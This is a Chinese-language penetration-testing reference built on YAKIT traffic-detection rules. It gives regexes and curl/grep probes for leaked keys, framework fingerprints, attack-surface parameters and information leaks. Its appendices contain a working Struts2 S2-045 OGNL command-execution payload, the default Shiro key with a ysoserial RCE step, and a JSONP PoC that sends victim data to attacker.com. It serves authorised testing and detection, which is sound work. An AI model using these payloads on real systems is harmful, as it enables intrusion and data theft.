---
title: "渗透测试被动检测规则（YAKIT 流量规则 59 条整理）"
author: "Saber / YAKIT traffic rules"
created: 2026-06-17
---

# 渗透测试被动检测规则

## 来源

YAKIT 流量检测规则（59 条），原始 JSON 见 `references/yakit-traffic-rules.json`。  
每条规则在 HTTP 请求/响应的 header/body 中做正则匹配，命中后打标签 + 标色。

## 使用场景

渗透测试中，对每个 HTTP 请求响应做被动嗅探，自动发现：
- 凭证泄露（AK/SK/Token/密码/私钥）
- 攻击面（SSRF/XXE/文件包含/SQLi 参数）
- 技术栈（Shiro/Struts2/JWT/Swagger/SourceMap）
- 信息泄露（邮箱/手机号/身份证/内网IP/路径）

---

## 一、凭证/密钥泄漏（🔴 红色 — 最高优先级）

### 1.1 凭据参数
| 匹配目标 | 正则模式 | 检测范围 | 检测场景 |
|---------|---------|---------|---------|
| 密码传输 | `(?i)((password)\|(pass)\|(secret)\|(mima))['"]?\s*[\:\=]` | Req Header+Body | 登录/注册/修改密码请求 |
| 用户名+密码对 | `(?i)((access\|admin\|...)[-_]{0,5}(key\|token\|secret))` | Req+Res Header+Body | API AK/SK 返回体 |

```bash
# 在响应中搜索 AK/SK
curl -sk "https://target.com/api/..." | grep -oP '(?i)(access[-_]?(key|secret|id|token)|secret[-_]?(key|id))'

# 在 JS 中搜索硬编码凭据
curl -sk "https://target.com/static/js/app.xxx.js" | grep -oP '(?i)(password|secret|token|apiKey)[^,}"]+' | head -20
```

### 1.2 GitHub Token
| 格式 | 正则 | 示例 |
|:---|:---|---:|
| `ghp_` + 36 字符 | `(ghp|ghu)\_[a-zA-Z0-9]{36}` | `ghp_<redacted>` |

```bash
curl -sk "https://target.com/etc" | grep -oP '(ghp|ghu)_[a-zA-Z0-9]{36}'
```

### 1.3 云平台密钥
| 平台 | 正则 | 特征 |
|:---|:---|---:|
| Aliyun AccessKey | `LTAI[a-z0-9]{12,20}` | 以 `LTAI` 开头 |
| Aliyun OSS | `[\w-]+\.oss\.aliyuncs\.com` | OSS endpoint |
| Amazon AK | `(AKIA\|AGPA\|AIDA\|...)[a-zA-Z0-9]{16}` | 以特定前缀开头 |
| AWS Region | `((us(-gov)?\|ap\|ca\|cn\|eu\|sa)-...)` | Region 格式泄漏 |

```bash
# 搜索阿里云密钥
curl -sk "https://target.com/config.js" | grep -oP 'LTAI[a-z0-9]{12,20}'

# 搜索阿里云 OSS 端点
curl -sk "https://target.com/.env" | grep -oP '[\w-]+\.oss\.aliyuncs\.com'
```

### 1.4 企业微信 Key
| 类型 | 正则 | 检测场景 |
|:---|:---|---:|
| corpId/secret | `([c\|C]or[p\|P]id\|[c\|C]orp[s\|S]ecret)` | 前端 config/JS 中 |
| 精简版 | `(corp)(id\|secret)` | 同上 |

### 1.5 Webhook
| 平台 | 正则 |
|:---|:---|
| Microsoft Teams | `https://outlook\.office\.com/webhook/[a-z0-9@-]+/IncomingWebhook/[a-z0-9-]+/[a-z0-9-]+` |
| Zoho | `https://creator\.zoho\.com/api/[A-Za-z0-9/\-_\.]+\?authtoken=[A-Za-z0-9]+` |

### 1.6 RSA 私钥 / 公钥
```bash
# RSA 私钥（Begins with -----BEGIN... PRIVATE KEY-----）
curl -sk "https://target.com/backup/" | grep -oP '[-]+BEGIN [^\s]+ PRIVATE KEY[-]'

# RSA 公钥
curl -sk "https://target.com/login" | grep -oP 'BEGIN PUBLIC KEY.*?END PUBLIC KEY'
```

### 1.7 JDBC 连接串
```bash
# JDBC URL 格式
curl -sk "https://target.com/config.properties" | grep -oP 'jdbc:[a-z:]+://[A-Za-z0-9\.\-_:;=/@?,&]+'

# 敏感点：直接暴露数据库地址和配置
curl -sk "https://target.com/META-INF/context.xml" | grep -oP 'jdbc:mysql://[^"]+'
```

### 1.8 OAuth / Sonarqube / 其他 Token
| 类型 | 正则 |
|:---|:---|
| OAuth Access Key | `ya29\.[0-9A-Za-z_-]+` |
| Sonarqube Token | `sonar.{0,50}(?:\"\|\\'\|`)?[0-9a-f]{40}` |

---

## 二、技术栈识别（🔴🔵 — 框架指纹）

### 2.1 Shiro

**检测方法：** 响应 Cookie 中是否含 `rememberMe=deleteMe`
```bash
curl -skI -o /dev/null "https://target.com/login" 2>&1 | grep -i 'set-cookie'
# 如果 Set-Cookie 含 rememberMe=deleteMe → Shiro
```

**YAKIT 规则：** `(=deleteMe|rememberMe=)` — 命中即 Shiro

### 2.2 Struts2

**检测方法：** 请求路径以 `.do` / `.action` 结尾
```bash
curl -sk -o /dev/null -w "%{http_code}" "https://target.com/test.action"
```

**YAKIT 规则：** `((GET|POST|http[s]?)\.*(do|action)[^a-zA-Z]` — 标记 struts 端点

### 2.3 Swagger UI

**检测方法：** 响应中搜索 swagger 特征词
```bash
# 直接访问知名端点
curl -sk -L "https://target.com/swagger-ui.html" | grep -i 'swagger'
curl -sk "https://target.com/v2/api-docs" | jq '.info'
curl -sk "https://target.com/v3/api-docs" | jq '.info'
```

**YAKIT 规则：** `((swagger-ui.html)|(\"swagger\":)|(Swagger UI)|(swaggerUi)|(swaggerVersion))`

### 2.4 Source Map

**检测方法：** 查找 `.js.map` 文件
```bash
curl -sk -o /dev/null -w "%{http_code}" "https://target.com/static/js/app.xxx.js.map"
# 200 → 可下载 Source Map → 反编译还原源码
```

### 2.5 JWT 自动检测

```bash
# 响应/请求中搜 ey 开头的 JWT
curl -sk "https://target.com/api/..." | grep -oP 'ey[A-Za-z0-9_-]{10,}\.[A-Za-z0-9._-]{10,}'
# 解码 JWT payload
echo "eyJxxx.yyyy.zzzz" | cut -d. -f2 | base64 -d 2>/dev/null | jq '.'
```

---

## 三、攻击面标记（🟢 — 测试点发现）

### 3.1 JSONP

```bash
# 请求/响应中搜 callback/jsonp 参数
curl -sk "https://target.com/api/data?callback=test" | grep -oP '(?i)(jsonp_[a-z0-9]+|(_callback|_cb|_call|_jsonp_?)=)'
```

**JSONP 参数字典：** `callback`, `jsonp`, `_callback`, `_cb`, `_call`, `jsonp_`, `jsonpcallback`

### 3.2 SSRF 参数

```bash
# 在请求参数中搜
curl -sk "https://target.com/api/fetch" -d 'url=http://internal/' | grep -oP '(wap=|url=|link=|src=|source=|sourceURl=|imageURL=|domain=)'
```

**SSRF 参数字典：** `wap`, `url`, `link`, `src`, `source`, `display`, `sourceURl`, `imageURL`, `domain`

### 3.3 命令注入参数

```bash
curl -sk "https://target.com/api/ping" -d 'ip=127.0.0.1' | grep -oP '(cmd=|exec=|command=|execute=|ping=|query=|jump=|code=|reg=|do=|func=|arg=|option=|load=|process=|step=|read=|function=|feature=|exe=|module=|payload=|run=|daemon=|upload=|dir=|download=|log=|ip=|cli=)'
```

### 3.4 文件包含参数

```bash
curl -sk "https://target.com/?page=index.php" | grep -oP '(file=|path=|url=|lang=|src=|menu=|meta-inf=|web-inf=|filename=|topic=|page=|_FilePath=|target=)'
```

### 3.5 URL 重定向参数

```bash
curl -sk "https://target.com/?redirect_to=http://evil.com" | grep -oP '(callback=|url=|request=|redirect_to=|jump=|to=|link=|domain=)'
```

### 3.6 文件上传点检测（HTML 表单）

```bash
curl -sk "https://target.com/upload" | grep -oP '(?is)<form.*enctype=.*?multipart/form-data.*?type=.*?file.*?</form>'
```

### 3.7 调试参数

```bash
# 请求中搜调试相关参数
curl -sk "https://target.com/?debug=1" | grep -oP '(access=|adm=|admin=|alter=|cfg=|clone=|config=|create=|dbg=|debug=|delete=|disable=|edit=|enable=|exec=|execute=|grant=|load=|make=|modify=|rename=|reset=|root=|shell=|test=|toggle=)'
```

---

## 四、信息泄露（🟢 — 被动嗅探）

### 4.1 内网 IP 泄露
```bash
curl -sk "https://target.com/" | grep -oP '\b((127\.0\.0\.1)|(localhost)|(10\.\d{1,3}\.\d{1,3}\.\d{1,3})|(172\.((1[6-9])|(2\d)|(3[01]))\.\d{1,3}\.\d{1,3})|(192\.168\.\d{1,3}\.\d{1,3}))\b'
```

### 4.2 操作系统路径泄露
```bash
# Linux 路径
curl -sk "https://target.com/error" | grep -oP '/(bin|dev|home|media|opt|root|sbin|sys|usr|boot|data|etc|lib|mnt|proc|run|srv|tmp|var)/[^\<\>()\[\],;:\s\"]+/'

# Windows 路径
curl -sk "https://target.com/error" | grep -oP '[a-zA-Z]:\\(\\w+\\)+'
```

### 4.3 邮箱/手机号/身份证
```bash
# 邮箱
curl -sk "https://target.com/api/users" | grep -oP '\b[\w.-]+@[\w.-]+\.(com|cn|edu)\b'

# 手机号（中国大陆）
curl -sk "https://target.com/api/users" | grep -oP '(?:(?:\+|00)86)?1(?:3[\d]|4[5-79]|5[0-35-9]|6[5-7]|7[0-8]|8[\d]|9[189])\d{8}\b'

# 身份证
curl -sk "https://target.com/api/users" | grep -oP '\b[1-9]\d{5}(?:18|19|20)\d{2}(?:0[1-9]|10|11|12)(?:0[1-9]|[1-2]\d|30|31)\d{3}[\dXx]\b'
```

### 4.4 数据库错误/框架错误
```bash
curl -sk "https://target.com/page?id=12'" | grep -oP '(Error report|in your SQL syntax|mysql_fetch_array|mysql_connect()|org.apache.catalina)'
```

### 4.5 目录枚举
```bash
curl -sk "https://target.com/uploads/" | grep -oP '(Directory listing for|Parent Directory|Index of|folder listing:)'
```

---

## 五、认证/权限（🟢 — 登录/后台发现）

### 5.1 登录点发现
```bash
# 含密码框的表单
curl -sk "https://target.com/login" | grep -oP '(?is)<form.*type=.*?text.*?type=.*?password.*?</form>'

# 后台管理页面
curl -sk "https://target.com/login" | grep -oP '(?i)<title>.*?(后台|admin).*?</title>'
```

### 5.2 非授权页面
```bash
curl -sk "https://target.com/admin/" | grep -oP '<.*?Unauthorized'
```

### 5.3 HTTP 认证头检测
```bash
curl -skI "https://target.com/" 2>&1 | grep -i '(Basic|Bearer|Digest|OAuth)'
```

### 5.4 SOAP / XML 请求识别
```bash
# SOAP
curl -sk "https://target.com/service.asmx" | grep -oP '(?is)^<?xml.*<soap:Body>'
# XML
curl -sk "https://target.com/service" -d '<xml>test</xml>' | grep -oP '(?is)^<?xml.*>$'
```

---

## 覆盖总表

| 类别 | 规则数 | 覆盖状态 | 对应 Skill |
|:---|:---:|:---:|:---|
| 凭证/密钥泄漏 | 18 条 | ✅ 新增本参考 | `info-gathering` |
| 技术栈指纹 | 6 条 | ✅ 新增本参考（含利用方法） | 本参考 |
| 攻击面参数 | 12 条 | ✅ 已有 Skill 覆盖 | ssrf/xxe/command-injection 等 |
| 信息泄露 | 7 条 | ✅ 新增本参考 | 本参考 |
| 登录/权限 | 4 条 | ✅ 基础覆盖 | api-authentication-assessment |
| Webhook/第三方 | 3 条 | ✅ 新增本参考 | — |

**原始 JSON:** `references/yakit-traffic-rules.json`

---

## 附录 A：Shiro 检测与利用

### 检测

```bash
# Cookie 特征
curl -skI "https://target.com/login" 2>&1 | grep -i "rememberMe"
# Set-Cookie: rememberMe=deleteMe  → 确认 Shiro

# 未授权访问测试
curl -sk "https://target.com/" -b "rememberMe=1" -o /dev/null -w "HTTP:%{http_code} Size:%{size_download}\n"
# 有 rememberMe Cookie 和没有的响应不同 → Shiro 在处理
```

### 利用思路

Shiro 的 `rememberMe` 功能使用 AES-128-CBC 加密序列化数据。如果默认密钥未修改（硬编码 `kPH+bIxk5D2deZiIxcaaaA==`），可以伪造任意 rememberMe Cookie 触发反序列化 RCE。

```bash
# 使用 shiro_attack_2.5 GUI 工具（搜索 github）
# 或 ysoserial + Shiro 模块
java -jar ysoserial-Shiro.jar CommonsBeanutils1 "command"
# 编码 + AES 加密后设为 Cookie: rememberMe=xxx
```

**检测关键：** 响应中出现 `rememberMe=deleteMe` = 100% Shiro。尝试默认密钥。

---

## 附录 B：Struts2 检测与利用

### 检测

```bash
# 端点特征：.do / .action 后缀
curl -sk "https://target.com/login.action" -o /dev/null -w "%{http_code}\n"
curl -sk "https://target.com/login.do" -o /dev/null -w "%{http_code}\n"

# OGNL 注入测试
curl -sk "https://target.com/login.action?user=%24%7B%23%61%70%70%6C%69%63%61%74%69%6F%6E%7D"
# 返回中如果出现 application name → OGNL 表达式执行成功
```

### 利用思路

Struts2 的 OGNL 注入（S2-045/S2-046/S2-061 等）通过 Content-Type / 参数名传递 OGNL 表达式执行命令：

```bash
# S2-045: Content-Type 中注入 OGNL
curl -sk "https://target.com/struts2-showcase/" \
  -H "Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```

**检测关键：** `.do` / `.action` 后缀 + OGNL 语法测试。

---

## 附录 C：JSONP 检测与利用

### JSONP 原理

JSONP 利用 `<script>` 标签跨域加载 JSON 回调。如果应用将敏感数据以 JSONP 形式返回（用户信息、Token 等），攻击者可构造恶意页面窃取。

### 检测

```bash
# JSONP 参数名检测
curl -sk "https://target.com/api/user?callback=test123"
curl -sk "https://target.com/api/user?jsonp=test123"
curl -sk "https://target.com/api/user?cb=test123"

# 确认 JSONP 存在
# 响应应为: test123({"id":1,"name":"...",...})
# 而不是: {"id":1,"name":"..."}

# 参数名自动检测（从 JS 中找）
curl -sk "https://target.com/static/js/app.xxx.js" | grep -oP '(callback|jsonp|_cb|_call|jsonp_?)[=:]' | sort -u
```

### PoC（利用页面）

```html
<script>
function test123(data) {
  fetch('https://attacker.com/steal?data=' + encodeURIComponent(JSON.stringify(data)));
}
</script>
<script src="https://target.com/api/user?callback=test123"></script>
```

**检测关键：** API 响应体 = `函数名({...})` 格式（不是纯 JSON `{...}`）。响应 Content-Type 通常为 `application/javascript` 或 `text/javascript`（非 `application/json`）。

---

## 附录 D：Source Map 还原

### 检测

```bash
# .js.map 文件是否存在
curl -sk -o /dev/null -w "%{http_code}" "https://target.com/static/js/app.xxx.js.map"

# 从 HTML 或 JS 中引用
curl -sk "https://target.com/static/js/app.xxx.js" | grep -oP 'sourceMappingURL=[^\s]+'
```

### 利用

```bash
# 下载 .js.map 用工具还原完整源码
# 安装: npm install -g source-map

# 方法1: 直接看（JSON 格式，搜索关键词）
curl -sk "https://target.com/static/js/app.xxx.js.map" | python3 -c "
import sys,json
d=json.load(sys.stdin)
# sources 数组包含所有原始文件名
for s in d.get('sources', []):
    print(s)
" | head -30

# 方法2: 使用 source-map 工具还原
# npx source-map --help
```

**价值：** 还原后的源码包含完整变量名/函数名/注释，比压缩的 JS 容易分析 10 倍。常见于生产环境忘记删除 `.js.map` 文件。

---

## 附录 E：调试参数检测

### 常见调试参数

```bash
# 批量测试调试参数（关注 200/500 响应）
for param in access adm admin alter cfg clone config create dbg debug delete disable edit enable exec execute grant load make modify rename reset root shell test toggl; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com/api?${param}=1")
  [ "$code" != "404" ] && [ "$code" != "400" ] && echo "${code} | ${param}=1"
done
```

### 典型场景

```
?debug=1         → 显示 SQL 查询/错误堆栈/调试信息
?debug=true      → 同上（Spring Boot DevTools 常见）
?admin=1         → 切换管理员视图
?test=1          → 测试模式绕过某些校验
?exec=id         → 命令执行（直接）
?shell=id        → 命令执行（通过 shell）
?reset=1         → 重置数据（危险）
```

### 调试端点

```bash
# Spring Boot actuator / DevTools
for path in /actuator /actuator/env /actuator/heapdump /actuator/threaddump; do
  curl -sk -o /dev/null -w "%{http_code}" "https://target.com${path}"
done

# PHP 调试模式直接读取源码
curl -sk "https://target.com/config.php?view-source"
curl -sk "https://target.com/index.php?source"
```

**检测关键：** 调试端点在 `/?param=1` 时返回 200（正常返回 400/404） → 参数被应用处理了，有利用价值。
